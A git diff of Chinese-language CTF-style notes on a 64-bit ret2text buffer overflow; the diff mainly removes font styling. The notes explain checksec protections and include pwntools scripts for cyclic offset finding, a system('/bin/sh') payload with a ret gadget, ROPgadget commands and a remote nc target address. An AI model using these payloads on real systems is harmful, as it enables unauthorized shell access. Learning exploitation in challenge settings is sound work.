@@ -11,30 +11,30 @@ categories:
 
 ![](1760618725040-59e3a325-8935-421a-958e-cd65f335efb9.png)
 
-### `<font style="color:rgb(0, 0, 0);">Arch: amd64-64-little</font>`
-+ <font style="color:rgb(0, 0, 0);">说明程序的架构是</font><font style="color:rgb(0, 0, 0);"> </font>**<font style="color:rgb(0, 0, 0) !important;">64 位的小端（Little-endian）x86-64</font>**<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">架构。小端是指数据的低位字节存储在内存的低地址处，这是 x86 系列处理器常用的字节序。在 64 位程序中，寄存器是 64 位的（如</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">RDI</font>`<font style="color:rgb(0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);">RSI</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">等），函数调用的参数传递、栈操作等都遵循 64 位的规则。</font>
+### `Arch: amd64-64-little`
++ 说明程序的架构是 **64 位的小端（Little-endian）x86-64** 架构。小端是指数据的低位字节存储在内存的低地址处，这是 x86 系列处理器常用的字节序。在 64 位程序中，寄存器是 64 位的（如 `RDI`、`RSI` 等），函数调用的参数传递、栈操作等都遵循 64 位的规则。
 
-### `<font style="color:rgb(0, 0, 0);">RELRO: Partial RELRO</font>`
-+ `<font style="color:rgb(0, 0, 0);">RELRO</font>`<font style="color:rgb(0, 0, 0);">（Relocation Read-Only）是一种保护机制，用于防止</font><font style="color:rgb(0, 0, 0);"> </font>**<font style="color:rgb(0, 0, 0) !important;">延迟绑定攻击</font>**<font style="color:rgb(0, 0, 0);">。</font>
-    - `<font style="color:rgb(0, 0, 0);">Partial RELRO</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">表示只有部分重定位表（如</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">.got</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">段）被设置为只读，而</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">.got.plt</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">段仍可写。这意味着攻击者仍有一定机会利用重定位相关的漏洞，但防护比</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">No RELRO</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">强。</font>
+### `RELRO: Partial RELRO`
++ `RELRO`（Relocation Read-Only）是一种保护机制，用于防止 **延迟绑定攻击**。
+    - `Partial RELRO` 表示只有部分重定位表（如 `.got` 段）被设置为只读，而 `.got.plt` 段仍可写。这意味着攻击者仍有一定机会利用重定位相关的漏洞，但防护比 `No RELRO` 强。
 
-### `<font style="color:rgb(0, 0, 0);">Stack: No canary found</font>`
-+ <font style="color:rgb(0, 0, 0);">表示程序 </font>**<font style="color:rgb(0, 0, 0) !important;">没有开启</font>****<u><font style="color:#DF2A3F;">栈金丝雀（Stack Canary）保护</font></u>**<font style="color:rgb(0, 0, 0);">。栈金丝雀是一种用于检测栈溢出的机制，在函数调用时会在栈上特定位置放置一个随机值（“金丝雀”），函数返回前检查该值是否被篡改。没有此保护的话，攻击者可以更轻易地进行栈溢出攻击，覆盖返回地址等关键数据。</font>
+### `Stack: No canary found`
++ 表示程序 **没有开启****<u>栈金丝雀（Stack Canary）保护</u>**。栈金丝雀是一种用于检测栈溢出的机制，在函数调用时会在栈上特定位置放置一个随机值（“金丝雀”），函数返回前检查该值是否被篡改。没有此保护的话，攻击者可以更轻易地进行栈溢出攻击，覆盖返回地址等关键数据。
 
-### `<font style="color:rgb(0, 0, 0);">NX: NX enabled</font>`
-+ `<font style="color:rgb(0, 0, 0);">NX</font>`<font style="color:rgb(0, 0, 0);">（No-eXecute，不可执行）保护已开启。这意味着内存的某些区域（通常是栈、堆等数据区域）被标记为不可执行，即使攻击者向这些区域注入了可执行代码，程序也无法执行这些代码。这限制了诸如注入 shellcode 这类攻击方式，但可以通过</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">ret2text</font>`<font style="color:rgb(0, 0, 0);">（返回程序自身代码段中的有用指令）等方式绕过。</font>
+### `NX: NX enabled`
++ `NX`（No-eXecute，不可执行）保护已开启。这意味着内存的某些区域（通常是栈、堆等数据区域）被标记为不可执行，即使攻击者向这些区域注入了可执行代码，程序也无法执行这些代码。这限制了诸如注入 shellcode 这类攻击方式，但可以通过 `ret2text`（返回程序自身代码段中的有用指令）等方式绕过。
 
-### `<font style="color:rgb(0, 0, 0);">PIE: No PIE (0x400000)</font>`
-+ `<font style="color:rgb(0, 0, 0);">PIE</font>`<font style="color:rgb(0, 0, 0);">（Position-Independent Executable，地址无关可执行文件）未开启。程序加载时的基地址是固定的（这里显示为</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">0x400000</font>`<font style="color:rgb(0, 0, 0);">）。这对漏洞利用很有利，因为程序中函数、字符串等的地址是固定的，攻击者可以直接使用这些固定地址来构造攻击载荷，而无需动态计算地址偏移。</font>
+### `PIE: No PIE (0x400000)`
++ `PIE`（Position-Independent Executable，地址无关可执行文件）未开启。程序加载时的基地址是固定的（这里显示为 `0x400000`）。这对漏洞利用很有利，因为程序中函数、字符串等的地址是固定的，攻击者可以直接使用这些固定地址来构造攻击载荷，而无需动态计算地址偏移。
 
-### `<font style="color:rgb(0, 0, 0);">Stripped: No</font>`
-+ <font style="color:rgb(0, 0, 0);">表示程序 </font>**<font style="color:rgb(0, 0, 0) !important;">没有被剥离（Stripped）符号表</font>**<font style="color:rgb(0, 0, 0);">。符号表中包含了函数名、变量名等调试信息。没有被剥离符号表的话，攻击者可以很方便地通过工具（如 </font>`<font style="color:rgb(0, 0, 0);">objdump</font>`<font style="color:rgb(0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);">gdb</font>`<font style="color:rgb(0, 0, 0);"> 等）查看程序中的函数、变量等信息，有助于分析程序结构和寻找漏洞利用点。</font>![](1760660400019-4c8a1334-8afa-4a53-a17f-b5b491e2a8ce.png)
-1. **<font style="color:rgb(0, 0, 0) !important;">信息收集</font>**
+### `Stripped: No`
++ 表示程序 **没有被剥离（Stripped）符号表**。符号表中包含了函数名、变量名等调试信息。没有被剥离符号表的话，攻击者可以很方便地通过工具（如 `objdump`、`gdb` 等）查看程序中的函数、变量等信息，有助于分析程序结构和寻找漏洞利用点。![](1760660400019-4c8a1334-8afa-4a53-a17f-b5b491e2a8ce.png)
+1. **信息收集**
 
-<font style="color:rgb(0, 0, 0);">首先通过</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">nc 152.32.191.198 33784</font>`<font style="color:rgb(0, 0, 0);">连接目标服务，观察输入输出模式（如是否有固定提示、输入长度限制等），判断溢出点可能存在的位置。</font>
+首先通过`nc 152.32.191.198 33784`连接目标服务，观察输入输出模式（如是否有固定提示、输入长度限制等），判断溢出点可能存在的位置。
 
-#### <font style="color:rgb(0, 0, 0);">确定溢出偏移量</font>
-<font style="color:rgb(0, 0, 0);">通过 cyclic 模式计算缓冲区到返回地址的偏移：</font>
+#### 确定溢出偏移量
+通过 cyclic 模式计算缓冲区到返回地址的偏移：
 
 ```python
 from pwn import *
@@ -46,25 +46,25 @@ p.sendline(payload)
 p.interactive()
 ```
 
-![](1760582863377-e25febc4-027c-47d1-a2fa-0b84cd9b7d26.png)<font style="color:rgb(0, 0, 0);">程序崩溃后，通过调试获取崩溃时的</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">rip</font>`<font style="color:rgb(0, 0, 0);">值（如</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">0x6161616161616168</font>`<font style="color:rgb(0, 0, 0);">），再用</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">cyclic_find(0x6161616161616168)</font>`<font style="color:rgb(0, 0, 0);">计算偏移量</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">offset</font>`<font style="color:rgb(0, 0, 0);">。</font>
+![](1760582863377-e25febc4-027c-47d1-a2fa-0b84cd9b7d26.png)程序崩溃后，通过调试获取崩溃时的`rip`值（如`0x6161616161616168`），再用`cyclic_find(0x6161616161616168)`计算偏移量`offset`。
 
-#### <font style="color:rgb(0, 0, 0);">2. 查找关键地址</font>
-<font style="color:rgb(0, 0, 0);">若程序中已存在</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">system</font>`<font style="color:rgb(0, 0, 0);">函数和</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">"/bin/sh"</font>`<font style="color:rgb(0, 0, 0);">字符串（ret2text 的核心前提）：</font>
+#### 2. 查找关键地址
+若程序中已存在`system`函数和`"/bin/sh"`字符串（ret2text 的核心前提）：
 
-+ <font style="color:rgb(0, 0, 0);">本地调试时，用</font>`<font style="color:rgb(0, 0, 0);">objdump -d 程序名 | grep system</font>`<font style="color:rgb(0, 0, 0);">获取</font>`<font style="color:rgb(0, 0, 0);">system</font>`<font style="color:rgb(0, 0, 0);">函数地址（如</font>`<font style="color:rgb(0, 0, 0);">0x400560</font>`<font style="color:rgb(0, 0, 0);">）。</font>
-+ <font style="color:rgb(0, 0, 0);">用</font>`<font style="color:rgb(0, 0, 0);">ROPgadget --binary 程序名 --string "/bin/sh"</font>`<font style="color:rgb(0, 0, 0);">获取字符串地址（如</font>`<font style="color:rgb(0, 0, 0);">0x601048</font>`<font style="color:rgb(0, 0, 0);">）。</font>
++ 本地调试时，用`objdump -d 程序名 | grep system`获取`system`函数地址（如`0x400560`）。
++ 用`ROPgadget --binary 程序名 --string "/bin/sh"`获取字符串地址（如`0x601048`）。
 
-<font style="color:rgb(0, 0, 0);">若目标为远程服务无法直接获取，可尝试：</font>
+若目标为远程服务无法直接获取，可尝试：
 
-+ <font style="color:rgb(0, 0, 0);">若服务基于 libc，通过泄露 libc 基地址计算</font>`<font style="color:rgb(0, 0, 0);">system</font>`<font style="color:rgb(0, 0, 0);">和</font>`<font style="color:rgb(0, 0, 0);">"/bin/sh"</font>`<font style="color:rgb(0, 0, 0);">地址（需额外的信息泄露漏洞）。</font>
-+ <font style="color:rgb(0, 0, 0);">若程序静态编译，直接在本地同版本程序中查找地址。</font>
++ 若服务基于 libc，通过泄露 libc 基地址计算`system`和`"/bin/sh"`地址（需额外的信息泄露漏洞）。
++ 若程序静态编译，直接在本地同版本程序中查找地址。
 
-#### <font style="color:rgb(0, 0, 0);">3. 构造 payload</font>
-<font style="color:rgb(0, 0, 0);">64 位程序中，函数参数前 6 个通过寄存器传递，但</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">system</font>`<font style="color:rgb(0, 0, 0);">仅需一个参数，构造格式如下：</font>
+#### 3. 构造 payload
+64 位程序中，函数参数前 6 个通过寄存器传递，但`system`仅需一个参数，构造格式如下：
 
-**<font style="color:rgba(0, 0, 0, 0.85);">python</font>**
+**python**
 
-<font style="color:rgba(0, 0, 0, 0.5);">运行</font>
+运行
 
 ```python
 from pwn import *
@@ -85,22 +85,22 @@ p.sendline(payload)
 p.interactive()  # 获取shell
 ```
 
-### <font style="color:rgb(0, 0, 0);">三、可能遇到的问题及解决</font>
-1. **<font style="color:rgb(0, 0, 0) !important;">地址错误</font>**<font style="color:rgb(0, 0, 0);">若执行后未获得 shell，可能是</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">system</font>`<font style="color:rgb(0, 0, 0);">或</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">"/bin/sh"</font>`<font style="color:rgb(0, 0, 0);">地址错误，需重新确认（可通过调试或泄露 libc 解决）。</font>
-2. **<font style="color:rgb(0, 0, 0) !important;">栈对齐问题</font>**<font style="color:rgb(0, 0, 0);">64 位程序可能要求栈对齐，若失败，可在</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">system</font>`<font style="color:rgb(0, 0, 0);">地址前添加</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">ret</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">gadget（如</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">0x400501</font>`<font style="color:rgb(0, 0, 0);">）调整栈：</font>**<font style="color:rgba(0, 0, 0, 0.85);">python</font>**<font style="color:rgba(0, 0, 0, 0.5);">运行</font>
+### 三、可能遇到的问题及解决
+1. **地址错误**若执行后未获得 shell，可能是`system`或`"/bin/sh"`地址错误，需重新确认（可通过调试或泄露 libc 解决）。
+2. **栈对齐问题**64 位程序可能要求栈对齐，若失败，可在`system`地址前添加`ret` gadget（如`0x400501`）调整栈：**python**运行
 
 ```python
 ret_gadget = 0x400501  # 通过ROPgadget查找的ret地址
 payload = b"A" * offset + p64(ret_gadget) + p64(system_addr) + p64(0) + p64(binsh_addr)
 ```
 
-3. **<font style="color:rgb(0, 0, 0) !important;">无</font>**`**<font style="color:rgb(0, 0, 0);">system</font>**`**<font style="color:rgb(0, 0, 0) !important;">或</font>**`**<font style="color:rgb(0, 0, 0);">"/bin/sh"</font>**`<font style="color:rgb(0, 0, 0);">若程序中没有这两个元素，需改用</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">ret2libc</font>`<font style="color:rgb(0, 0, 0);">技术：先泄露 libc 基地址，再计算对应地址。</font>
+3. **无**`**system**`**或**`**"/bin/sh"**`若程序中没有这两个元素，需改用`ret2libc`技术：先泄露 libc 基地址，再计算对应地址。
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
+
+
+
 
 ```plain
 # 仅用于生成 200 字节的 cyclic 模式字符串（修复字节/字符串类型问题）
@@ -143,23 +143,23 @@ b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
 
 进程已结束，退出代码为 0
 
-<font style="color:rgb(0, 0, 0);">完美！cyclic 字符串已经成功生成，接下来就进入核心的偏移量计算环节，具体操作步骤如下：</font>
+完美！cyclic 字符串已经成功生成，接下来就进入核心的偏移量计算环节，具体操作步骤如下：
 
-### <font style="color:rgb(0, 0, 0);">一、获取崩溃时的</font>`<font style="color:rgb(0, 0, 0);">rip</font>`<font style="color:rgb(0, 0, 0);">值</font>
-1. **<font style="color:rgb(0, 0, 0) !important;">本地调试场景</font>**
-    - <font style="color:rgb(0, 0, 0);">打开终端，用 GDB 启动目标程序：</font>`<font style="color:rgb(0, 0, 0);">gdb ./目标程序名</font>`<font style="color:rgb(0, 0, 0);">。</font>
-    - <font style="color:rgb(0, 0, 0);">在 GDB 中输入</font>`<font style="color:rgb(0, 0, 0);">run</font>`<font style="color:rgb(0, 0, 0);">运行程序，当程序等待输入时，粘贴之前生成的 cyclic 字符串（终端输出的字节串或从</font>`<font style="color:rgb(0, 0, 0);">cyclic_str.txt</font>`<font style="color:rgb(0, 0, 0);">复制）。</font>
-    - <font style="color:rgb(0, 0, 0);">程序崩溃后，输入</font>`<font style="color:rgb(0, 0, 0);">info registers rip</font>`<font style="color:rgb(0, 0, 0);">命令，记录下输出的十六进制</font>`<font style="color:rgb(0, 0, 0);">rip</font>`<font style="color:rgb(0, 0, 0);">值（例如</font>`<font style="color:rgb(0, 0, 0);">0x616161616161616c</font>`<font style="color:rgb(0, 0, 0);">）。</font>
-2. **<font style="color:rgb(0, 0, 0) !important;">远程服务场景</font>**
-    - <font style="color:rgb(0, 0, 0);">若无法本地复现，需确保远程程序与本地样本完全一致，直接在本地调试样本获取</font>`<font style="color:rgb(0, 0, 0);">rip</font>`<font style="color:rgb(0, 0, 0);">值即可（偏移量通常通用）。</font>
-    - <font style="color:rgb(0, 0, 0);">若远程连接发送 cyclic 字符串后崩溃，可通过日志或调试工具（如 pwntools 的</font>`<font style="color:rgb(0, 0, 0);">gdb.attach</font>`<font style="color:rgb(0, 0, 0);">）获取</font>`<font style="color:rgb(0, 0, 0);">rip</font>`<font style="color:rgb(0, 0, 0);">值。</font>
+### 一、获取崩溃时的`rip`值
+1. **本地调试场景**
+    - 打开终端，用 GDB 启动目标程序：`gdb ./目标程序名`。
+    - 在 GDB 中输入`run`运行程序，当程序等待输入时，粘贴之前生成的 cyclic 字符串（终端输出的字节串或从`cyclic_str.txt`复制）。
+    - 程序崩溃后，输入`info registers rip`命令，记录下输出的十六进制`rip`值（例如`0x616161616161616c`）。
+2. **远程服务场景**
+    - 若无法本地复现，需确保远程程序与本地样本完全一致，直接在本地调试样本获取`rip`值即可（偏移量通常通用）。
+    - 若远程连接发送 cyclic 字符串后崩溃，可通过日志或调试工具（如 pwntools 的`gdb.attach`）获取`rip`值。
 
-### <font style="color:rgb(0, 0, 0);">二、计算偏移量</font>`<font style="color:rgb(0, 0, 0);">offset</font>`
-<font style="color:rgb(0, 0, 0);">将获取到的</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">rip</font>`<font style="color:rgb(0, 0, 0);">值代入以下代码，运行后直接得到偏移量：</font>
+### 二、计算偏移量`offset`
+将获取到的`rip`值代入以下代码，运行后直接得到偏移量：
 
-**<font style="color:rgba(0, 0, 0, 0.85);">python</font>**
+**python**
 
-<font style="color:rgba(0, 0, 0, 0.5);">运行</font>
+运行
 
 ```python
 from pwn import *
@@ -170,46 +170,46 @@ offset = cyclic_find(rip_value)
 print(f"最终计算的溢出偏移量：{offset}")
 ```
 
-### <font style="color:rgb(0, 0, 0);">三、后续操作</font>
-<font style="color:rgb(0, 0, 0);">拿到</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">offset</font>`<font style="color:rgb(0, 0, 0);">后，结合之前教你的方法查找</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">system</font>`<font style="color:rgb(0, 0, 0);">地址、</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">/bin/sh</font>`<font style="color:rgb(0, 0, 0);">地址、</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">ret</font>`<font style="color:rgb(0, 0, 0);">和</font>`<font style="color:rgba(0, 0, 0, 0.85) !important;">pop rdi; ret</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">gadget，就能填充到之前的完整 exp 脚本中，执行即可尝试获取 shell。</font>
+### 三、后续操作
+拿到`offset`后，结合之前教你的方法查找`system`地址、`/bin/sh`地址、`ret`和`pop rdi; ret` gadget，就能填充到之前的完整 exp 脚本中，执行即可尝试获取 shell。
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
+
+
+
+
+
+
 
 ![](1760663762309-5f42e0fa-9947-4f28-8081-05320b19d7d0.png)
 
-<font style="color:rgb(77, 77, 77);"> /bin/sh </font><font style="color:rgb(78, 161, 219) !important;">字符串</font><font style="color:rgb(77, 77, 77);">的地址：0x400808</font><font style="color:rgb(77, 77, 77);">64 位程序与 32 位程序传参规则的不同：</font>
+ /bin/sh 字符串的地址：0x40080864 位程序与 32 位程序传参规则的不同：
 
-<font style="color:rgb(77, 77, 77);"></font>
 
-<font style="color:rgb(77, 77, 77);">在 32 位汇编中，参数是直接放在堆栈上的，而不是放在寄存器上。</font>
 
-<font style="color:rgb(77, 77, 77);"></font>
+在 32 位汇编中，参数是直接放在堆栈上的，而不是放在寄存器上。
 
-<font style="color:rgb(77, 77, 77);">但是对于 64 位汇编，当参数少于等于 6 个时，参数从左到右依次放入寄存器：rdi、rsi、rdx、rcx、r8、r9。当参数为 7 个以上时，前 6 个参数仍然按照上述规则放入寄存器，但是第 7 个及以后的参数从右向左依次放入栈中。也就是说要先把六个寄存器放满了才会考虑放入栈。</font>
 
-<font style="color:rgb(77, 77, 77);"></font>
 
-<font style="color:rgb(77, 77, 77);">有的题，里面既没有现成的 system 函数，也没有 /bin/sh 字符串，也没有提供 libc.so 给我们，那么我们要做的就是想办法泄露 libc 地址，拿到 system 函数和 /bin/sh 字符串，我们就需要获取 rdi, rsi, rdx, rcx, r8, r9 它们的地址，首先要获取的是 rdi 的地址。</font>
+但是对于 64 位汇编，当参数少于等于 6 个时，参数从左到右依次放入寄存器：rdi、rsi、rdx、rcx、r8、r9。当参数为 7 个以上时，前 6 个参数仍然按照上述规则放入寄存器，但是第 7 个及以后的参数从右向左依次放入栈中。也就是说要先把六个寄存器放满了才会考虑放入栈。
 
-<font style="color:rgb(77, 77, 77);"></font>
 
-<font style="color:rgb(77, 77, 77);">rdi 的地址我们使用工具 ROPgadget 来获取：</font>
 
-<font style="color:rgb(77, 77, 77);"></font>
+有的题，里面既没有现成的 system 函数，也没有 /bin/sh 字符串，也没有提供 libc.so 给我们，那么我们要做的就是想办法泄露 libc 地址，拿到 system 函数和 /bin/sh 字符串，我们就需要获取 rdi, rsi, rdx, rcx, r8, r9 它们的地址，首先要获取的是 rdi 的地址。
 
-<font style="color:rgb(77, 77, 77);">ROPgadget --binary pwn --only "pop|ret" | grep rdi</font>
 
-<font style="color:rgb(77, 77, 77);">————————————————</font>
+
+rdi 的地址我们使用工具 ROPgadget 来获取：
+
+
+
+ROPgadget --binary pwn --only "pop|ret" | grep rdi
+
+————————————————
 
 参数解释：
 
